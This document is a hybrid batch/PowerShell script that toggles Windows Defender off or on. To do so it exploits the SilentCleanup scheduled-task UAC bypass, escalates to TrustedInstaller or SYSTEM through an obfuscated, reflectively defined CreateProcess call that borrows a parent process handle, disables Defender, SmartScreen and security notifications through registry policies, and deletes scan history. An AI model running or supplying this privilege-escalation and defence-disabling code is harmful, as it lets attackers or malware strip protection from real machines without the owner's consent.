@(echo off% <#%) &title Toggle Defender, AveYo 2020-11-16          || configure just auto-actions OFF; toggle icon on ltsb
set "0=%~f0"&set 1=%*&powershell -nop -win 1 -c iex ([io.file]::ReadAllText($env:0))  ||#>)[1]
sp 'HKCU:\Volatile Environment' 'ToggleDefender' @'
if ($(sc.exe qc windefend) -like '*TOGGLE*') {$TOGGLE=7;$KEEP=6;$A='Enable';$S='OFF'}else{$TOGGLE=6;$KEEP=7;$A='Disable';$S='ON'}

## Comment to hide dialog prompt with Yes, No, Cancel (6,7,2)
#if ($env:1 -ne 6 -and $env:1 -ne 7) {
  #$choice=(new-object -ComObject Wscript.Shell).Popup($A + ' Windows Defender?', 0, 'Defender is: ' + $S, 51)
  #if ($choice -eq 2) {break} elseif ($choice -eq 6) {$env:1=$TOGGLE} else {$env:1=$KEEP}
#}

## Without the dialog prompt above will toggle automatically
if ($env:1 -ne 6 -and $env:1 -ne 7) { $env:1=$TOGGLE }

## Comment to not relaunch systray icon
start cmd -args '/d/r SecurityHealthSystray & "%ProgramFiles%\Windows Defender\MSASCuiL.exe"' -win 1

## Comment to not hide per-user toggle notifications
$notif='HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance'
ni $notif -ea 0|out-null; ri $notif.replace('Settings','Current') -Recurse -Force -ea 0
sp $notif Enabled 0 -Type Dword -Force -ea 0; if ($TOGGLE -eq 7) {rp $notif Enabled -Force -ea 0}

## 'UAC is not a security boundary' - OK, Microsoft. But why do you refuse to adress the lamest AlwaysNotify-compatible bpass?
$ts=New-Object -ComObject 'Schedule.Service'; $ts.Connect(); $baffling=$ts.GetFolder('\Microsoft\Windows\DiskCleanup')
$bpass=$baffling.GetTask('SilentCleanup'); $flaw=$bpass.Definition

## Cascade elevation
$u=0;$w=whoami /groups;if($w-like'*1-5-32-544*'){$u=1};if($w-like'*1-16-12288*'){$u=2};if($w-like'*1-16-16384*'){$u=3}

## Reload from volatile registry as needed
$r=[char]13; $nfo=[char]39+$r+' (\   /)'+$r+'( * . * )  A limited account protects you from UAC exploits'+$r+'    ```'+$r+[char]39
$script='-nop -win 1 -c & {rp hkcu:\environment windir -ea 0;$AveYo='+$nfo+';$env:1='+$env:1; $env:__COMPAT_LAYER='Installer'
$script+=';iex((gp Registry::HKEY_Users\S-1-5-21*\Volatile* ToggleDefender -ea 0)[0].ToggleDefender)}'; $cmd='powershell '+$script

## 0: limited-user: must runas
if ($u -eq 0) {
  start powershell -args $script -verb runas -win 1; break
}

## 1: admin-user non-elevated: try windows built-in lame uac bpass before runas
if ($u -eq 1) {
  if ($flaw.Actions.Item(1).Path -inotlike '*windir*'){start powershell -args $script -verb runas -win 1; break}
  sp hkcu:\environment windir $('powershell '+$script+' #')
  $z=$bpass.RunEx($null,2,0,$null); $wait=0; while($bpass.State -gt 3 -and $wait -lt 17){sleep -m 100; $wait+=0.1}
  if(gp hkcu:\environment windir -ea 0){rp hkcu:\environment windir -ea 0;start powershell -args $script -verb runas -win 1};break
}

## 2: admin-user elevated: get ti/system via runasti lean and mean snippet [$window hide:0x0E080600 show:0x0E080610]
if ($u -eq 2) {
  $A=[AppDomain]::CurrentDomain."Def`ineDynamicAssembly"(1,1)."Def`ineDynamicModule"(1);$D=@();0..5|%{$D+=$A."Def`ineType"('A'+$_,
  1179913,[ValueType])} ;4,5|%{$D+=$D[$_]."Mak`eByRefType"()} ;$I=[Int32];$J="Int`Ptr";$P=$I.module.GetType("System.$J"); $F=@(0)
  $F+=($P,$I,$P),($I,$I,$I,$I,$P,$D[1]),($I,$P,$P,$P,$I,$I,$I,$I,$I,$I,$I,$I,[Int16],[Int16],$P,$P,$P,$P),($D[3],$P),($P,$P,$I,$I)
  $S=[String]; $9=$D[0]."Def`inePInvokeMethod"('CreateProcess',"kernel`32",8214,1,$I,@($S,$S,$I,$I,$I,$I,$I,$S,$D[6],$D[7]),1,4)
  1..5|%{$k=$_;$n=1;$F[$_]|%{$9=$D[$k]."Def`ineField"('f'+$n++,$_,6)}};$T=@();0..5|%{$T+=$D[$_]."Cr`eateType"();$Z=[uintptr]::size
  nv ('T'+$_)([Activator]::CreateInstance($T[$_]))}; $H=$I.module.GetType("System.Runtime.Interop`Services.Mar`shal");
  $WP=$H."Get`Method"("Write$J",[type[]]($J,$J)); $HG=$H."Get`Method"("AllocH`Global",[type[]]'int32'); $v=$HG.invoke($null,$Z)
  'TrustedInstaller','lsass'|%{if(!$pn){net1 start $_ 2>&1 >$null;$pn=[Diagnostics.Process]::GetProcessesByName($_)[0];}}
  $WP.invoke($null,@($v,$pn.Handle)); $SZ=$H."Get`Method"("SizeOf",[type[]]'type'); $T1.f1=131072; $T1.f2=$Z; $T1.f3=$v; $T2.f1=1
  $T2.f2=1;$T2.f3=1;$T2.f4=1;$T2.f6=$T1;$T3.f1=$SZ.invoke($null,$T[4]);$T4.f1=$T3;$T4.f2=$HG.invoke($null,$SZ.invoke($null,$T[2]))
  $H."Get`Method"("StructureTo`Ptr",[type[]]($D[2],$J,'boolean')).invoke($null,@(($T2-as $D[2]),$T4.f2,$false));$window=0x0E080600
  $9=$T[0]."Get`Method"('CreateProcess').Invoke($null,@($null,$cmd,0,0,0,$window,0,$null,($T4-as $D[4]),($T5-as $D[5]))); break
}

## Create registry paths
$wdp='HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'
' Security Center\Notifications','\UX Configuration','\MpEngine','\Spynet','\Real-Time Protection' |% {ni ($wdp+$_)-ea 0|out-null}

## Toggle Defender
#if ($env:1 -eq 7) {
#  rp 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications' DisableNotifications -Force -ea 0
#  rp 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration' Notification_Suppress -Force -ea 0
#  rp 'HKLM:\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications' DisableNotifications -Force -ea 0
#  rp 'HKLM:\SOFTWARE\Microsoft\Windows Defender\UX Configuration' Notification_Suppress -Force -ea 0
#  rp 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\System' EnableSmartScreen -Force -ea 0
#  rp 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' DisableAntiSpyware -Force -ea 0
#  rp 'HKLM:\SOFTWARE\Microsoft\Windows Defender' DisableAntiSpyware -Force -ea 0
#  sc.exe config windefend depend= RpcSs
#  net1 start windefend
#  kill -Force -Name MpCmdRun -ea 0
#  start ($env:ProgramFiles+'\Windows Defender\MpCmdRun.exe') -Arg '-EnableService' -win 1
#} else {
  sp 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications' DisableNotifications 1 -Type Dword -ea 0
  sp 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration' Notification_Suppress 1 -Type Dword -Force -ea 0
  sp 'HKLM:\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications' DisableNotifications 1 -Type Dword -ea 0
  sp 'HKLM:\SOFTWARE\Microsoft\Windows Defender\UX Configuration' Notification_Suppress 1 -Type Dword -Force -ea 0
  sp 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\System' EnableSmartScreen 0 -Type Dword -Force -ea 0
  sp 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' DisableAntiSpyware 1 -Type Dword -Force -ea 0
  sp 'HKLM:\SOFTWARE\Microsoft\Windows Defender' DisableAntiSpyware 1 -Type Dword -Force -ea 0
  net1 stop windefend
  sc.exe config windefend depend= RpcSs-TOGGLE
  kill -Name MpCmdRun -Force -ea 0
  start ($env:ProgramFiles+'\Windows Defender\MpCmdRun.exe') -Arg '-DisableService' -win 1
  del ($env:ProgramData+'\Microsoft\Windows Defender\Scans\mpenginedb.db') -Force -ea 0           ## Commented = keep scan history
  del ($env:ProgramData+'\Microsoft\Windows Defender\Scans\History\Service') -Recurse -Force -ea 0
#}

## PERSONAL CONFIGURATION TWEAK - COMMENT OR UNCOMMENT #rp ENTRIES TO TWEAK OR REVERT
sp $wdp DisableRoutinelyTakingAction 1 -Type Dword -Force -ea 0                       ## Auto Actions OFF
# rp $wdp DisableRoutinelyTakingAction -Force -ea 0                                   ## Auto Actions ON [default]
sp $wdp PUAProtection 1 -Type Dword -Force -ea 0                                      ## Potential Unwanted Apps ON
rp $wdp PUAProtection -Force -ea 0                                                    ## Potential Unwanted Apps OFF [default]
#sp ($wdp+'\MpEngine') MpCloudBlockLevel 2 -Type Dword -Force -ea 0                    ## Cloud blocking level HIGH
rp ($wdp+'\MpEngine') MpCloudBlockLevel -Force -ea 0                                  ## Cloud blocking level LOW [default]
#sp ($wdp+'\Spynet') SpyNetReporting 2 -Type Dword -Force -ea 0                        ## Cloud protection ADVANCED
rp ($wdp+'\Spynet') SpyNetReporting -Force -ea 0                                      ## Cloud protection BASIC [default]
sp ($wdp+'\Spynet') SubmitSamplesConsent 0 -Type Dword -Force -ea 0                   ## Sample Submission ALWAYS-PROMPT
rp ($wdp+'\Spynet') SubmitSamplesConsent -Force -ea 0                                 ## Sample Submission AUTOMATIC [default]
#sp ($wdp+'\Real-Time Protection') RealtimeScanDirection 1 -Type Dword -Force -ea 0    ## Scan incoming file only
#rp ($wdp+'\Real-Time Protection') RealtimeScanDirection -Force -ea 0                  ## Scan incoming and outgoing file [default]

## Uncomment to close windows built-in lame uac bpass and/or reset uac
# if ($flaw.Actions.Item(1).Path -ilike '*windir*') {
#   $flaw.Actions.Item(1).Path=$env:systemroot+'\system32\cleanmgr.exe'               ## %windir%\system32\cleanmgr.exe [default]
#   $baffling.RegisterTaskDefinition($bpass.Name,$flaw,20,$null,$null,$null)          ## UAC silent bpass mitigation
#   $uac='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
#   sp $uac EnableLUA 1 -Type Dword -Force -ea 0                                      ## UAC enable
#   sp $uac ConsentPromptBehaviorAdmin 2 -Type Dword -Force -ea 0                     ## UAC always notify - bpassable otherwise
#   sp $uac PromptOnSecureDesktop 1 -Type Dword -Force -ea 0                          ## UAC secure - prevent automation
# }

'@ -Force -ea 0; iex((gp Registry::HKEY_Users\S-1-5-21*\Volatile* ToggleDefender -ea 0)[0].ToggleDefender)
#-_-# hybrid script, can be pasted directly into powershell console
